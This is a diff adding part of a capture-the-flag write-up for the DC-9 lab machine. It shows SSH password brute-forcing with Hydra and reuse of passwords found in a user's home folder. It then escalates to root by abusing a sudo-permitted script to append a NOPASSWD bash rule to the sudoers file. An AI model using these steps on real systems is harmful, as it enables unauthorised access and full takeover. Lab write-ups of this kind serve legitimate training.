@@ -468,5 +468,121 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-02 21:35:
 [22][ssh] host: 192.168.193.209   login: janitor   password: Ilovepeepee
 1 of 1 target successfully completed, 3 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-02 21:36:00
+```
 
+After logging in as `janitor`.
+
+```
+janitor@dc-9:~$ pwd
+/home/janitor
+janitor@dc-9:~$ ls -lah
+total 16K
+drwx------  4 janitor janitor 4.0K Jul  4 19:29 .
+drwxr-xr-x 19 root    root    4.0K Dec 29  2019 ..
+lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null
+drwx------  3 janitor janitor 4.0K Jul  4 19:29 .gnupg
+drwx------  2 janitor janitor 4.0K Dec 29  2019 .secrets-for-putin
+janitor@dc-9:~$ cat .secrets-for-putin/passwords-found-on-post-it-notes.txt
+BamBam01
+Passw0rd
+smellycats
+P0Lic#10-4
+B4-Tru3-001
+4uGU5T-NiGHts
+```
+
+We have another list of passwords to bruteforce even more.
+
+```
+> hydra -t 40 192.168.238.209 ssh -I -L usernames.txt -P pass2.txt
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-04 04:31:37
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 40 tasks per 1 server, overall 40 tasks, 119 login tries (l:17/p:7), ~3 tries per task
+[DATA] attacking ssh://192.168.238.209:22/
+[22][ssh] host: 192.168.238.209   login: fredf   password: B4-Tru3-001
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-04 04:31:51
+```
+
+```
+> ssh fredf@192.168.238.209
+fredf@192.168.238.209's password: 
+Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jul  4 19:32:27 2024 from 192.168.45.159
+fredf@dc-9:~$ ls
+local.txt
+fredf@dc-9:~$ cat local.txt 
+9ead8110e7cc15c72efc718fec950c54
+```
+
+## Privilege escalation
+
+```
+fredf@dc-9:~$ sudo -l
+Matching Defaults entries for fredf on dc-9:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User fredf may run the following commands on dc-9:
+    (root) NOPASSWD: /opt/devstuff/dist/test/test
+fredf@dc-9:~$ file /opt/devstuff/dist/test/test
+/opt/devstuff/dist/test/test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=28ba79c778f7402713aec6af319ee0fbaf3a8014, stripped
+fredf@dc-9:~$ cd /opt/devstuff/dist/test/
+fredf@dc-9:/opt/devstuff/dist/test$ ls
+base_library.zip                                 libbz2.so.1.0         _lzma.cpython-37m-x86_64-linux-gnu.so
+_bz2.cpython-37m-x86_64-linux-gnu.so             libcrypto.so.1.1      _multibytecodec.cpython-37m-x86_64-linux-gnu.so
+_codecs_cn.cpython-37m-x86_64-linux-gnu.so       libexpat.so.1         _opcode.cpython-37m-x86_64-linux-gnu.so
+_codecs_hk.cpython-37m-x86_64-linux-gnu.so       liblzma.so.5          readline.cpython-37m-x86_64-linux-gnu.so
+_codecs_iso2022.cpython-37m-x86_64-linux-gnu.so  libpython3.7m.so.1.0  resource.cpython-37m-x86_64-linux-gnu.so
+_codecs_jp.cpython-37m-x86_64-linux-gnu.so       libreadline.so.7      _ssl.cpython-37m-x86_64-linux-gnu.so
+_codecs_kr.cpython-37m-x86_64-linux-gnu.so       libssl.so.1.1         termios.cpython-37m-x86_64-linux-gnu.so
+_codecs_tw.cpython-37m-x86_64-linux-gnu.so       libtinfo.so.6         test
+_hashlib.cpython-37m-x86_64-linux-gnu.so         libz.so.1
+fredf@dc-9:/opt/devstuff/dist/test$ ./test 
+Usage: python test.py read append
+fredf@dc-9:/opt/devstuff/dist/test$ 
+```
+
+So this user can execute `/opt/devstuff/dist/test/test` as root. Notice that the folder contains shared libraries of Python, and the help message suggests a python script. This is a clear sign of a compiled python script. And sure it is.
+
+```
+fredf@dc-9:/opt/devstuff$ cat test.py 
+#!/usr/bin/python
+
+import sys
+
+if len (sys.argv) != 3 :
+    print ("Usage: python test.py read append")
+    sys.exit (1)
+
+else :
+    f = open(sys.argv[1], "r")
+    output = (f.read())
+
+    f = open(sys.argv[2], "a")
+    f.write(output)
+    f.close()
+```
+
+So we know that we can basically run `cp` as root. There are many ways to get root, let's append the sudoers file.
+
+```
+fredf@dc-9:/etc/sudoers.d$ echo "fredf   ALL=(root) NOPASSWD: /usr/bin/bash" > /tmp/conf
+fredf@dc-9:/etc/sudoers.d$ sudo /opt/devstuff/dist/test/test /tmp/conf /etc/sudoers.d/template
+fredf@dc-9:/etc/sudoers.d$ sudo /usr/bin/bash
+root@dc-9:/etc/sudoers.d# id
+uid=0(root) gid=0(root) groups=0(root)
+root@dc-9:/etc/sudoers.d# cd /root
+root@dc-9:~# ls
+proof.txt
+root@dc-9:~# cat proof.txt 
+92c099c595872e4d21927ae710866e38
 ```
